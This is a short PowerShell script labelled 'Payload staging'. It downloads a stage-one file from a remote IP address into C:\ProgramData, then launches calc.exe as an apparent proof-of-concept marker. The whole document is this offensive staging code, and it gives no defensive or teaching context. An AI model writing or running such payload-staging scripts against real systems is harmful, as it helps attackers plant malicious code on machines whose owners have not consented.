<# Payload staging #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://192.0.2.87/stage1.ps1',
    [string]$DownloadPath = "C:\ProgramData\stage1.bin",
    [int]$RequestTimeout = 10
)
try { Invoke-WebRequest -Uri $RemoteUrl -OutFile $DownloadPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; Start-Sleep -Seconds 41 } catch { Write-Warning "Remote fetch failed" }
